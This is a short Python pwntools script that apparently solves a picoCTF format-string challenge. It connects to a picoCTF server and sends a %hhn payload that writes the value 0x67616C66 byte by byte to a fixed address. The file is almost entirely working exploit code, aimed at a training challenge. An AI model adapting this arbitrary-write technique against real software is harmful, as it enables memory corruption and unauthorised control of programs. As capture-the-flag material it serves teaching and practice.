from pwn import *

def main():
    sus_addr = 0x404060
    target_addr = 0x67616C66
    fmt_top_idx = 13  # %lx が 13個分

    # [0x404020] = 0x8a
    # [0x404021] = 0x12
    # [0x404022] = 0x40

    r = remote("rhea.picoctf.net", 54003)

    payload = b""

    padlen = 12 * 4
    write_fmt = "%{}c%{}$hhn%{}c%{}$hhn%{}c%{}$hhn%{}c%{}$hhn".format(
        (target_addr >> 0) % 256,
        fmt_top_idx + padlen // 8 + 1,
        (target_addr >> 8) % 256 - (target_addr >> 0) % 256 + 256,
        fmt_top_idx + padlen // 8 + 2,
        (target_addr >> 16) % 256 - (target_addr >> 8) % 256 + 256,
        fmt_top_idx + padlen // 8 + 3,
        (target_addr >> 24) % 256 - (target_addr >> 16) % 256 + 256,
        fmt_top_idx + padlen // 8 + 4,
    ).encode()

    payload += write_fmt

    for i in range(4):
        current_addr = sus_addr + i
        current_bytes = pack(current_addr, 64)
        payload += current_bytes

    print(payload)

    r.recvuntil(b"What do you have to say?")
    r.sendline(payload)
    print(r.recvall().decode())


if __name__ == "__main__":
    main()
